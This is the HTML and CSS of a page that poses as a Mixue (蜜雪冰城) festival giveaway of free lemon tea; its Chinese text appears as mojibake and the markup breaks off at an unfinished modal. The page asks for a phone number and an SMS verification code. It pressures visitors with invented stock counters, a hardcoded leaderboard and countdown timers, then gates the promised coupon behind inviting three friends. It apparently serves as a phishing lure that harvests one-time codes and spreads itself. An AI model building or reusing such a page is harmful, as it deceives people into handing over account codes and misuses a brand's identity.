<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.7.7/axios.min.js"></script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>èœœé›ªå†°åŸ Â· é™æ—¶ç¦åˆ© Â· å…è´¹é¢†æŸ æª¬èŒ¶</title>
  <style>
    :root {
      --mixue-red: #E63946;
      --mixue-yellow: #FFD166;
      --mixue-white: #F8F9FA;
      --mixue-dark: #252422;
      --mixue-gray: #CCC5B9;
      --shadow-light: 0 8px 32px rgba(230, 57, 70, 0.25);
      --radius-lg: 28px;
      --radius-md: 18px;
      --radius-sm: 12px;
    }
    * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "PingFang SC", "Hiragino Sans GB", sans-serif;
      background: url('https://pub-141831e61e69445289222976a15b6fb3.r2.dev/Image_to_url_V2/1000046878-imagetourl.cloud-1770310883157-bp2dgh.jpg') no-repeat center center fixed;
      background-size: cover;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px 15px;
      position: relative;
      overflow-x: hidden;
    }
    body::before {
      content: "";
      position: fixed;
      inset: 0;
      background: linear-gradient(180deg, rgba(230,57,70,0.08), rgba(255,209,102,0.05));
      z-index: -1;
    }

    /* å¯åŠ¨åŠ è½½ç”»é¢ */
    .splash-screen {
      position: fixed;
      inset: 0;
      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 999999;
      transition: opacity 0.5s ease-out;
    }
    .splash-screen.hide {
      opacity: 0;
      pointer-events: none;
    }
    .splash-logo {
      width: 120px;
      height: 120px;
      background: white;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 60px;
      margin-bottom: 30px;
      animation: bounce 1s infinite;
      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
    }
    @keyframes bounce {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-20px); }
    }
    .splash-text {
      color: white;
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 20px;
      letter-spacing: 2px;
    }
    .splash-progress {
      width: 200px;
      height: 6px;
      background: rgba(255,255,255,0.3);
      border-radius: 3px;
      overflow: hidden;
    }
    .splash-progress-bar {
      height: 100%;
      background: var(--mixue-yellow);
      width: 0%;
      transition: width 0.1s linear;
      border-radius: 3px;
    }
    .splash-hint {
      color: rgba(255,255,255,0.8);
      font-size: 0.9rem;
      margin-top: 15px;
    }

    .card { width:100%; max-width:420px; background:rgba(255,255,255,0.98); border-radius:var(--radius-lg); overflow:hidden; box-shadow:var(--shadow-light); border:1px solid rgba(230,57,70,0.1); animation:fadeUp 0.6s ease-out; }
    @keyframes fadeUp { 0% {opacity:0; transform:translateY(30px);} 100% {opacity:1; transform:translateY(0);} }

    .header { background:linear-gradient(135deg, var(--mixue-red), #C92A39); color:var(--mixue-white); padding:42px 28px 24px; text-align:center; position:relative; }
    .header::after { content:""; position:absolute; bottom:0; left:0; right:0; height:6px; background:var(--mixue-yellow); }
    .header h1 { font-size:2.6rem; font-weight:900; letter-spacing:2px; text-shadow:0 2px 4px rgba(0,0,0,0.1); }
    .header p { margin:10px 0 16px; font-size:1.15rem; font-weight:500; opacity:0.95; }

    .activity-period { font-size:0.9rem; background:rgba(255,255,255,0.15); padding:10px 20px; border-radius:50px; display:inline-block; margin:8px 0 16px; }
    #globalTimer { color:var(--mixue-yellow); font-weight:700; }

    .stock-info { font-size:1rem; background:rgba(0,0,0,0.2); padding:10px 20px; border-radius:50px; margin:12px auto; max-width:90%; font-weight:600; }
    .low-stock { color:var(--mixue-yellow) !important; animation:blinkWarn 1s infinite alternate; }
    @keyframes blinkWarn { from {opacity:1;} to {opacity:0.7;} }

    .join-count { text-align:center; font-size:1.2rem; color:var(--mixue-red); background:rgba(255,209,102,0.15); padding:12px; margin:0; font-weight:700; animation:pulse 2.5s infinite; }
    @keyframes pulse { 0%,100% {transform:scale(1);} 50% {transform:scale(1.03);} }

    .content { padding:32px 28px 40px; background:var(--mixue-white); }

    .barrage-box { 
      height: 58px;
      margin:0 0 20px; 
      background:rgba(230,57,70,0.05); 
      border-radius:var(--radius-sm); 
      overflow:hidden; 
      position:relative; 
      border:1px solid rgba(230,57,70,0.1); 
    }
    .barrage-item { 
      position:absolute; 
      white-space:nowrap; 
      font-size:0.78rem; 
      font-weight:600; 
      padding:4px 12px; 
      line-height:1.25; 
      left:100%; 
      background:rgba(255,255,255,0.94); 
      border-radius:10px; 
      box-shadow:0 1px 3px rgba(0,0,0,0.07); 
      z-index:1; 
      animation:barrageSlide linear forwards; 
      will-change: transform;
      pointer-events: none;
    }
    @keyframes barrageSlide { 
      0% { transform:translateX(0); } 
      100% { transform:translateX(calc(-100vw - 140%)); } 
    }

    .input-box { position:relative; margin-bottom:20px; }
    input { width:100%; height:56px; padding:0 24px; border:2px solid var(--mixue-gray); border-radius:var(--radius-md); font-size:1rem; background:#fff; transition:all 0.3s; }
    input:focus { outline:none; border-color:var(--mixue-red); box-shadow:0 0 0 6px rgba(230,57,70,0.1); transform:translateY(-2px); }
    input.input-error { border-color:#ff4d4f; box-shadow:0 0 0 6px rgba(255,77,79,0.1); animation:shake 0.3s; }
    @keyframes shake { 0%,100% {transform:translateX(0);} 25% {transform:translateX(-4px);} 75% {transform:translateX(4px);} }

    .verify-slider {
      width: 100%;
      height: 54px;
      background: #f0f2f5;
      border-radius: 27px;
      position: relative;
      margin: 24px 0 32px;
      overflow: hidden;
      border: 1px solid #e8eaed;
      box-shadow: inset 0 2px 4px rgba(0,0,0,0.06);
      opacity: 0;
      transform: translateY(12px);
      transition: all 0.4s ease;
      pointer-events: none;
    }

    .verify-slider.show {
      opacity: 1;
      transform: translateY(0);
      pointer-events: auto;
    }

    .verify-bg {
      position: absolute;
      left: 0;
      top: 0;
      height: 100%;
      background: linear-gradient(90deg, #ffd166, #ffbd59);
      width: 0;
      transition: width 0.18s ease;
      border-radius: 27px 0 0 27px;
    }

    .verify-success .verify-bg {
      background: linear-gradient(90deg, #52c41a, #73d13d);
      border-radius: 27px;
    }

    .verify-block {
      position: absolute;
      left: 0;
      top: 0;
      width: 54px;
      height: 54px;
      background: white;
      border-radius: 50%;
      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      font-weight: bold;
      color: #666;
      cursor: grab;
      transition: all 0.2s ease;
      z-index: 2;
      user-select: none;
    }

    .verify-block:active {
      cursor: grabbing;
      transform: scale(1.08);
      box-shadow: 0 6px 20px rgba(0,0,0,0.22);
    }

    .verify-success .verify-block {
      background: #52c41a;
      color: white;
      box-shadow: 0 4px 16px rgba(82,196,26,0.4);
    }

    .verify-text {
      position: absolute;
      left: 0;
      right: 0;
      top: 0;
      bottom: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #8c8c8c;
      font-size: 0.98rem;
      font-weight: 500;
      pointer-events: none;
      z-index: 1;
      transition: color 0.3s;
    }

    .verify-success .verify-text {
      color: #52c41a;
      font-weight: 600;
    }

    .btn { width:100%; height:60px; background:linear-gradient(135deg, var(--mixue-red), #D62E3D); color:#fff; border:none; border-radius:var(--radius-md); font-size:1.25rem; font-weight:700; cursor:pointer; transition:all 0.3s; margin-top:16px; box-shadow:0 6px 16px rgba(230,57,70,0.3); position: relative; overflow: hidden; }
    .btn:disabled { background:var(--mixue-gray); cursor:not-allowed; box-shadow:none; opacity:0.7; }
    .btn::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(255,255,255,0.3);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }
    .btn:active::after {
      width: 300px;
      height: 300px;
    }

    .loading-mask { position:fixed; inset:0; background:rgba(255,255,255,0.95); display:none; flex-direction:column; align-items:center; justify-content:center; z-index:99999; backdrop-filter:blur(8px); }
    .loading-mask.show { display:flex; }
    .loading-spinner { width:60px; height:60px; border:5px solid #f3f3f3; border-top:5px solid var(--mixue-red); border-radius:50%; animation:spin 1s linear infinite; margin-bottom:24px; }
    @keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }
    
    .loading-title { 
      font-size:1.5rem; 
      color:var(--mixue-red); 
      font-weight:700; 
      margin-bottom:12px;
      animation:pulse 2s infinite;
    }
    .loading-subtitle { 
      font-size:1rem; 
      color:#666; 
      font-weight:500; 
      text-align:center;
      padding:0 40px;
      line-height:1.6;
    }
    .loading-hint {
      position:absolute;
      bottom:40px;
      font-size:0.85rem;
      color:#999;
      text-align:center;
      padding:0 30px;
    }

    .modal { position:fixed; inset:0; background:rgba(0,0,0,0.65); display:none; align-items:center; justify-content:center; z-index:100000; }
    .modal.show { display:flex; }
    .modal-content { background:#fff; border-radius:var(--radius-lg); padding:40px 30px; text-align:center; max-width:320px; width:90%; box-shadow:var(--shadow-light); position: relative; overflow: hidden; }
    .modal-content h2 { color:var(--mixue-red); margin-bottom:16px; font-size:1.8rem; }
    .coupon-code { background:var(--mixue-yellow); color:var(--mixue-dark); padding:12px 20px; border-radius:var(--radius-sm); font-weight:bold; margin:16px 0; letter-spacing:1px; font-size: 1.1rem; }
    .modal-emoji { font-size:2.5rem; margin:16px 0; }

    .toast-container { position:fixed; top:20px; left:50%; transform:translateX(-50%); z-index:999999; display:flex; flex-direction:column; gap:8px; }
    .toast { background:rgba(0,0,0,0.7); color:#fff; padding:12px 24px; border-radius:20px; font-size:0.95rem; animation:toastIn 0.3s ease-out; }
    @keyframes toastIn { from { opacity:0; transform:translateY(-20px); } to { opacity:1; transform:translateY(0); } }

    .agreement {
      text-align: center;
      font-size: 0.82rem;
      color: #666;
      margin-top: 16px;
      line-height: 1.5;
    }
    .agreement a {
      color: var(--mixue-red);
      text-decoration: none;
      font-weight: 500;
      cursor: pointer;
    }
    .agreement a:hover {
      text-decoration: underline;
    }

    .rejected-modal .modal-content {
      border: 3px solid #ff4d4f;
    }
    .rejected-modal h2 {
      color: #ff4d4f;
    }

    /* é‚€è¯·å¥½å‹é¡µé¢æ ·å¼ */
    .invite-page {
      display: none;
      padding: 20px;
      text-align: center;
    }
    .invite-page.show {
      display: block;
    }
    .invite-header {
      background: linear-gradient(135deg, var(--mixue-red), #C92A39);
      color: white;
      padding: 30px 20px;
      border-radius: var(--radius-lg);
      margin-bottom: 20px;
      position: relative;
      overflow: hidden;
    }
    .invite-header::before {
      content: 'â„';
      position: absolute;
      font-size: 120px;
      opacity: 0.1;
      top: -20px;
      right: -20px;
      animation: rotate 10s linear infinite;
    }
    @keyframes rotate {
      from { transform: rotate(0deg); }
      to { transform: rotate(360deg); }
    }
    .invite-header h2 {
      font-size: 1.5rem;
      margin-bottom: 10px;
    }
    .invite-progress {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 10px;
      margin: 20px 0;
    }
    .invite-step {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      background: rgba(255,255,255,0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: bold;
      transition: all 0.3s;
      position: relative;
    }
    .invite-step.active {
      background: var(--mixue-yellow);
      color: var(--mixue-dark);
      transform: scale(1.1);
      animation: glow 1.5s infinite;
    }
    @keyframes glow {
      0%, 100% { box-shadow: 0 0 5px var(--mixue-yellow); }
      50% { box-shadow: 0 0 20px var(--mixue-yellow); }
    }
    .invite-step.completed {
      background: #52c41a;
      color: white;
    }
    .invite-line {
      width: 30px;
      height: 3px;
      background: rgba(255,255,255,0.3);
      border-radius: 2px;
    }
    .invite-line.completed {
      background: #52c41a;
    }
    .invite-stats {
      background: white;
      border-radius: var(--radius-md);
      padding: 20px;
      margin-bottom: 20px;
      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
      position: relative;
    }
    .invite-count {
      font-size: 3rem;
      color: var(--mixue-red);
      font-weight: 900;
    }
    .invite-label {
      color: #666;
      font-size: 0.9rem;
    }
    .chance-count {
      margin-top: 10px;
      font-size: 1.2rem;
      color: var(--mixue-yellow);
      font-weight: 700;
      text-shadow: 0 1px 2px rgba(0,0,0,0.1);
    }
    .bonus-tag {
      position: absolute;
      top: -10px;
      right: 10px;
      background: linear-gradient(135deg, #ff4d4f, #ff7875);
      color: white;
      padding: 4px 12px;
      border-radius: 20px;
      font-size: 0.75rem;
      font-weight: 700;
      animation: shake 2s infinite;
    }

    /* å€’è®¡æ—¶çº¢åŒ… */
    .countdown-bonus {
      background: linear-gradient(135deg, #fff7e6, #fff1b8);
      border: 2px dashed #ffa940;
      border-radius: var(--radius-sm);
      padding: 12px;
      margin-bottom: 15px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .countdown-bonus .label {
      color: #d46b08;
      font-weight: 700;
      font-size: 0.9rem;
    }
    .countdown-bonus .timer {
      color: #cf1322;
      font-weight: 900;
      font-size: 1.1rem;
      font-family: monospace;
    }

    /* æ’è¡Œæ¦œ */
    .leaderboard {
      background: rgba(230,57,70,0.05);
      border-radius: var(--radius-sm);
      padding: 15px;
      margin-bottom: 15px;
      text-align: left;
    }
    .leaderboard h4 {
      color: var(--mixue-red);
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .leaderboard-item {
      display: flex;
      align-items: center;
      padding: 8px 0;
      border-bottom: 1px dashed rgba(0,0,0,0.1);
      font-size: 0.85rem;
    }
    .leaderboard-item:last-child {
      border-bottom: none;
    }
    .leaderboard-rank {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-weight: 700;
      font-size: 0.75rem;
      margin-right: 10px;
    }
    .rank-1 { background: gold; color: #8B4513; }
    .rank-2 { background: silver; color: #666; }
    .rank-3 { background: #CD7F32; color: white; }
    .rank-other { background: #f0f0f0; color: #999; }
    .leaderboard-name { flex: 1; color: #333; }
    .leaderboard-count { color: var(--mixue-red); font-weight: 700; }

    /* ä¼˜åŒ–è½¬ç›˜æ ·å¼ */
    .wheel-container {
      position: relative;
      width: 280px;
      height: 280px;
      margin: 20px auto;
    }
    .wheel {
      width: 100%;
      height: 100%;
      border-radius: 50%;
      position: relative;
      overflow: hidden;
      border: 8px solid var(--mixue-red);
      box-shadow: 0 10px 30px rgba(230,57,70,0.3), inset 0 0 20px rgba(0,0,0,0.05);
      transition: transform 4s cubic-bezier(0.17, 0.67, 0.12, 0.99);
      background: white;
    }
    .wheel-item {
      position: absolute;
      width: 50%;
      height: 50%;
      transform-origin: right bottom;
      left: 0;
      top: 0;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding-top: 25px;
      padding-right: 40px;
      font-weight: 700;
      clip-path: polygon(0 0, 100% 0, 100% 100%);
    }
    .wheel-item:nth-child(1) { transform: rotate(0deg); background: #FFF2F0; color: #CF1322; }
    .wheel-item:nth-child(2) { transform: rotate(45deg); background: #FFF7E6; color: #D46B08; }
    .wheel-item:nth-child(3) { transform: rotate(90deg); background: #F6FFED; color: #389E0D; }
    .wheel-item:nth-child(4) { transform: rotate(135deg); background: #E6FFFB; color: #08979C; }
    .wheel-item:nth-child(5) { transform: rotate(180deg); background: #F9F0FF; color: #722ED1; }
    .wheel-item:nth-child(6) { transform: rotate(225deg); background: #FFF0F6; color: #EB2F96; }
    .wheel-item:nth-child(7) { transform: rotate(270deg); background: #FFF2E8; color: #FA541C; }
    .wheel-item:nth-child(8) { transform: rotate(315deg); background: #FCFFE6; color: #7CB305; }
    
    .wheel-item .emoji {
      font-size: 1.8rem;
      margin-bottom: 5px;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.1));
    }
    .wheel-item .text {
      font-size: 0.7rem;
      line-height: 1.2;
      text-align: center;
      max-width: 60px;
    }
    
    .wheel-pointer {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 60px;
      height: 60px;
      background: var(--mixue-red);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      color: white;
      box-shadow: 0 4px 15px rgba(230,57,70,0.4), 0 0 0 4px white, 0 0 0 8px rgba(230,57,70,0.2);
      z-index: 10;
      animation: pointerPulse 2s infinite;
    }
    @keyframes pointerPulse {
      0%, 100% { transform: translate(-50%, -50%) scale(1); }
      50% { transform: translate(-50%, -50%) scale(1.05); }
    }
    .wheel-pointer::before {
      content: '';
      position: absolute;
      top: -18px;
      left: 50%;
      transform: translateX(-50%);
      border-left: 14px solid transparent;
      border-right: 14px solid transparent;
      border-bottom: 24px solid var(--mixue-red);
    }

    .wheel-btn {
      background: linear-gradient(135deg, #52c41a, #73d13d);
      margin-top: 20px;
      animation: btnPulse 2s infinite;
    }
    @keyframes btnPulse {
      0%, 100% { box-shadow: 0 6px 16px rgba(82,196,26,0.3); }
      50% { box-shadow: 0 6px 25px rgba(82,196,26,0.5); }
    }
    .wheel-btn:disabled {
      background: var(--mixue-gray);
      animation: none;
    }

    /* é‚€è¯·å¥½å‹æŒ‰é’® */
    .invite-more-btn {
      background: linear-gradient(135deg, #FA541C, #FF7A45);
      margin-top: 20px;
    }
    .invite-more-btn:disabled {
      background: var(--mixue-gray);
    }

    /* å…‘æ¢åŒºåŸŸ */
    .redeem-box {
      display: flex;
      gap: 10px;
      margin-top: 20px;
      align-items: center;
      background: rgba(230,57,70,0.05);
      padding: 15px;
      border-radius: var(--radius-sm);
      border: 2px dashed rgba(230,57,70,0.2);
    }
    .redeem-box .input-box {
      flex: 1;
      margin-bottom: 0;
    }
    .redeem-box input {
      height: 50px;
      font-size: 1.1rem;
      text-align: center;
      letter-spacing: 3px;
      text-transform: uppercase;
      font-weight: 700;
      color: var(--mixue-red);
    }
    .redeem-box input::placeholder {
      text-transform: none;
      font-size: 0.85rem;
      letter-spacing: 0;
      font-weight: 400;
      color: #999;
    }
    .redeem-btn {
      width: 80px;
      height: 50px;
      background: linear-gradient(135deg, var(--mixue-red), #D62E3D);
      color: white;
      border: none;
      border-radius: var(--radius-sm);
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      box-shadow: 0 4px 12px rgba(230,57,70,0.3);
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
    }
    .redeem-btn:active {
      transform: scale(0.95);
    }
    .redeem-btn::after {
      content: 'ğŸ';
      position: absolute;
      top: -5px;
      right: -5px;
      font-size: 20px;
      opacity: 0.3;
    }

    .invite-rules {
      background: rgba(230,57,70,0.05);
      border-radius: var(--radius-sm);
      padding: 15px;
      margin-top: 20px;
      text-align: left;
      font-size: 0.85rem;
      color: #666;
    }
    .invite-rules h4 {
      color: var(--mixue-red);
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    .invite-rules li {
      margin: 5px 0;
      list-style: none;
      padding-left: 15px;
      position: relative;
    }
    .invite-rules li::before {
      content: 'â€¢';
      color: var(--mixue-red);
      position: absolute;
      left: 0;
      font-weight: 900;
    }

    /* ç­¾åˆ°å¥–åŠ± */
    .check-in-btn {
      background: linear-gradient(135deg, #722ED1, #9254DE);
      margin-top: 10px;
      font-size: 1rem;
    }
    .check-in-btn:disabled {
      background: var(--mixue-gray);
    }

    /* ç²’å­åŠ¨ç”» */
    .particle {
      position: fixed;
      pointer-events: none;
      z-index: 999999;
      animation: particleFloat 3s ease-out forwards;
    }
    @keyframes particleFloat {
      0% {
        opacity: 1;
        transform: translate(0, 0) rotate(0deg) scale(1);
      }
      100% {
        opacity: 0;
        transform: translate(var(--tx), var(--ty)) rotate(720deg) scale(0);
      }
    }

    /* é˜²ä½œå¼Šæç¤º */
    .cheat-warning {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      background: #ff4d4f;
      color: white;
      text-align: center;
      padding: 10px;
      font-weight: 700;
      z-index: 9999999;
      display: none;
    }
    .cheat-warning.show {
      display: block;
      animation: slideDown 0.3s ease-out;
    }
    @keyframes slideDown {
      from { transform: translateY(-100%); }
      to { transform: translateY(0); }
    }

    /* é”®ç›˜æç¤º */
    .keyboard-hint {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background: rgba(0,0,0,0.7);
      color: white;
      padding: 8px 12px;
      border-radius: 20px;
      font-size: 0.75rem;
      opacity: 0;
      transition: opacity 0.3s;
      z-index: 100;
    }
    .keyboard-hint.show {
      opacity: 1;
    }

    .hidden { display: none !important; }

    /* æ–°å¢ï¼šå¤åˆ¶/åˆ†äº«/å†å²æŒ‰é’®æ ·å¼ */
    .copy-btn, .share-btn, .history-btn {
      margin-top: 12px;
      background: linear-gradient(135deg, #13c2c2, #36cfc9);
    }
    .history-list {
      max-height: 200px;
      overflow-y: auto;
      background: #f8f9fa;
      border-radius: 12px;
      padding: 12px;
      margin: 16px 0;
      font-size: 0.95rem;
      color: #333;
      text-align: left;
    }
    .history-item {
      padding: 8px 0;
      border-bottom: 1px solid #eee;
    }
    .history-item:last-child { border-bottom: none; }
  </style>
</head>
<body>

<!-- é˜²ä½œå¼Šè­¦å‘Š -->
<div class="cheat-warning" id="cheatWarning">
  âš ï¸ æ£€æµ‹åˆ°å¼‚å¸¸æ“ä½œï¼Œè¯·ä½¿ç”¨æ­£å¸¸è®¾å¤‡å‚ä¸æ´»åŠ¨
</div>

<!-- é”®ç›˜æç¤º -->
<div class="keyboard-hint" id="keyboardHint">æŒ‰ç©ºæ ¼é”®æŠ½å¥– | ESCå…³é—­</div>

<!-- å¯åŠ¨åŠ è½½ç”»é¢ -->
<div class="splash-screen" id="splashScreen">
  <div class="splash-logo">ğŸ¦</div>
  <div class="splash-text" id="splashText">é›ªç‹æ­£åœ¨èµ¶æ¥â€¦</div>
  <div class="splash-progress">
    <div class="splash-progress-bar" id="splashProgress"></div>
  </div>
  <div class="splash-hint">æ­£åœ¨åŠ è½½ç”œèœœç¦åˆ©...</div>
</div>

<div class="toast-container" id="toastContainer"></div>

<div class="loading-mask" id="loadingMask">
  <div class="loading-spinner"></div>
  <div class="loading-title">é›ªç‹æ­£åœ¨è§‚å¯Ÿä¸€åˆ‡â€¦â€¦</div>
  <div class="loading-subtitle">æ­£åœ¨æ£€æŸ¥ç¯å¢ƒä¸­ï¼Œä¸è¦ç¦»å¼€æˆ–åˆ·æ–°æ­¤é¡µé¢</div>
  <div class="loading-hint">é¢„è®¡å®¡æ ¸æ—¶é—´ï¼š30ç§’ - 2åˆ†é’Ÿ<br>è¯·ä¿æŒç½‘ç»œç•…é€š</div>
</div>

<!-- ä¸»é¡µé¢ -->
<div class="card" id="mainPage">
  <div class="header">
    <h1>èœœé›ªå†°åŸ</h1>
    <p>æ˜¥èŠ‚ç‹‚æ¬¢ Â· å…è´¹é¢†å¤§æ¯æŸ æª¬èŒ¶</p>
    <div class="activity-period">
      æ´»åŠ¨è¿›è¡Œä¸­ï¼š2026å¹´1æœˆ30æ—¥ â€” 2026å¹´2æœˆ18æ—¥<br>
      <strong id="globalTimer">æœ¬è½®åé¢å€’è®¡æ—¶ï¼šè®¡ç®—ä¸­...</strong>
    </div>
    <div class="stock-info">å…¨å›½é™é‡<span id="totalStockDisplay">5000</span>ä»½ï¼Œå·²é¢† <span id="claimedCount">4567</span> å¼ ï¼Œä»…å‰© <span id="remainCount">433</span> å¼ </div>
  </div>

  <div class="join-count">å·²æœ‰ <span id="countNum">4,567</span> äººæŠ¢åˆ°ç¦åˆ©</div>

  <div class="content">
    <div class="barrage-box" id="barrageBox"></div>

    <div class="fair-tip" style="text-align:center; color:#666; margin-bottom:20px; font-size:0.9rem;">ä¸ºä¿è¯å…¬å¹³ï¼Œä¸¥ç¦ä½¿ç”¨è„šæœ¬æˆ–å¤–æŒ‚ï¼Œè¿è§„æ°¸ä¹…å°å·</div>

    <div class="input-box">
      <input type="text" id="nickname" placeholder="æ˜µç§°ï¼ˆé€‰å¡«ï¼‰" maxlength="20" autocomplete="off" />
    </div>

    <div class="input-box">
      <input type="tel" id="phone" placeholder="è¯·è¾“å…¥æ‰‹æœºå·" maxlength="11" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
    </div>

    <div class="verify-slider" id="verifySlider">
      <div class="verify-bg" id="verifyBg"></div>
      <div class="verify-block" id="verifyBlock">â†’</div>
      <div class="verify-text">å‘å³æ»‘åŠ¨å®ŒæˆéªŒè¯</div>
    </div>

    <div class="input-box">
      <input type="text" id="code" placeholder="è¯·è¾“å…¥éªŒè¯ç " maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
    </div>

    <button class="btn" id="getCodeBtn" disabled>è·å–éªŒè¯ç </button>
    <button class="btn" id="submitBtn" style="display:none;" disabled>ç«‹å³é¢†å–</button>

    <div id="countdown" style="opacity:0; color:var(--mixue-red); text-align:center; margin-top:14px; font-size:0.95rem;"></div>

    <div class="agreement">
      ç™»å½•å³ä»£è¡¨åŒæ„
      <a onclick="showAgreement('privacy')">ã€Šéšç§æ”¿ç­–ã€‹</a>
      å’Œ
      <a onclick="showAgreement('user')">ã€Šç”¨æˆ·åè®®ã€‹</a>
    </div>
  </div>
</div>

<!-- é‚€è¯·å¥½å‹é¡µé¢ -->
<div class="card hidden" id="invitePage">
  <div class="invite-header">
    <h2>ğŸ‰ æ­å–œé€šè¿‡å®¡æ ¸ï¼</h2>
    <p>è¿˜å·®ä¸€ç‚¹ç‚¹å°±èƒ½é¢†åˆ°åˆ¸ç å•¦</p>
    <div class="invite-progress">
      <div class="invite-step completed" id="step1">1</div>
      <div class="invite-line completed" id="line1"></div>
      <div class="invite-step" id="step2">2</div>
      <div class="invite-line" id="line2"></div>
      <div class="invite-step" id="step3">3</div>
    </div>
    <p style="font-size: 0.9rem; opacity: 0.9;">é‚€è¯· 3 ä½å¥½å‹åŠ©åŠ›å³å¯é¢†å–</p>
  </div>
  
  <div class="content">
    <!-- é™æ—¶å¥–åŠ± -->
    <div class="countdown-bonus" id="countdownBonus">
      <span class="label">â° é™æ—¶ç¿»å€å¥–åŠ±</span>
      <span class="timer" id="bonusTimer">05:00</span>
    </div>

    <!-- æ’è¡Œæ¦œ -->
    <div class="leaderboard">
      <h4>ğŸ† é‚€è¯·æ’è¡Œæ¦œ</h4>
      <div class="leaderboard-item">
        <div class="leaderboard-rank rank-1">1</div>
        <div class="leaderboard-name">æ**</div>
        <div class="leaderboard-count">128äºº</div>
      </div>
      <div class="leaderboard-item">
        <div class="leaderboard-rank rank-2">2</div>
        <div class="leaderboard-name">ç‹**</div>
        <div class="leaderboard-count">96äºº</div>
      </div>
      <div class="leaderboard-item">
        <div class="leaderboard-rank rank-3">3</div>
        <div class="leaderboard-name">å¼ **</div>
        <div class="leaderboard-count">85äºº</div>
      </div>
    </div>

    <div class="invite-stats">
      <div class="bonus-tag" id="bonusTag" style="display: none;">ç¿»å€ä¸­</div>
      <div class="invite-count" id="inviteCount">0</div>
      <div class="invite-label">ä½å¥½å‹å·²åŠ©åŠ›</div>
      <div class="chance-count" id="chanceCount">å‰©ä½™æŠ½å¥–æ¬¡æ•°ï¼š0</div>
    </div>

    <!-- è½¬ç›˜ -->
    <div class="wheel-container" id="wheelContainer" style="display: none;">
      <div class="wheel" id="wheel">
        <div class="wheel-item"><span class="emoji">ğŸ</span><span class="text">æŸ æª¬èŒ¶åˆ¸</span></div>
        <div class="wheel-item"><span class="emoji">ğŸ˜¢</span><span class="text">è°¢è°¢æƒ é¡¾</span></div>
        <div class="wheel-item"><span class="emoji">ğŸ¦</span><span class="text">å†°æ·‡æ·‹åˆ¸</span></div>
        <div class="wheel-item"><span class="emoji">ğŸ˜­</span><span class="text">å†æ¥å†å‰</span></div>
        <div class="wheel-item"><span class="emoji">ğŸ§‹</span><span class="text">å¥¶èŒ¶åˆ¸</span></div>
        <div class="wheel-item"><span class="emoji">ğŸ¤”</span><span class="text">å·®ä¸€ç‚¹</span></div>
        <div class="wheel-item"><span class="emoji">ğŸŠ</span><span class="text">ç¥ç§˜å¤§å¥–</span></div>
        <div class="wheel-item"><span class="emoji">ğŸ˜…</span><span class="text">ä¸‹æ¬¡å†æ¥</span></div>
      </div>
      <div class="wheel-pointer">ğŸ‘†</div>
    </div>

    <!-- å…‘æ¢é‚€è¯·ç åŒºåŸŸ -->
    <div class="redeem-box">
      <div class="input-box" style="flex:1; margin-bottom:0;">
        <input type="text" id="inviteCodeInput" placeholder="è¯·è¾“å…¥å¥½å‹é‚€è¯·ç " maxlength="6" />
      </div>
      <button class="redeem-btn" id="redeemBtn">å…‘æ¢</button>
    </div>

    <!-- ç­¾åˆ°æŒ‰é’® -->
    <button class="btn check-in-btn" id="checkInBtn">ğŸ“… æ¯æ—¥ç­¾åˆ° (+1æ¬¡æœºä¼š)</button>

    <button class="btn invite-more-btn" id="inviteMoreBtn">é‚€è¯·å¥½å‹</button>
    <button class="btn wheel-btn hidden" id="wheelBtn">ğŸ° å¼€å§‹æŠ½å¥–</button>

    <div class="invite-rules">
      <h4>ğŸ® æ´»åŠ¨è§„åˆ™</h4>
      <li>æ¯é‚€è¯·1ä½å¥½å‹è·å¾—éšæœºæŠ½å¥–æ¬¡æ•°ï¼ˆ1-5æ¬¡ï¼‰</li>
      <li>é™æ—¶ç¿»å€æœŸé—´é‚€è¯·å¥–åŠ±ç¿»å€</li>
      <li>é‚€è¯·æ»¡3ä½å¥½å‹å¿…å¾—æŸ æª¬èŒ¶åˆ¸ç </li>
      <li>æ¯æ—¥ç­¾åˆ°å¯è·å¾—é¢å¤–æŠ½å¥–æœºä¼š</li>
      <li>æ´»åŠ¨æœ€ç»ˆè§£é‡Šæƒå½’èœœé›ªå†°åŸæ‰€æœ‰</li>
    </div>
  </div>
</div>

<div class="modal" id="successModal">
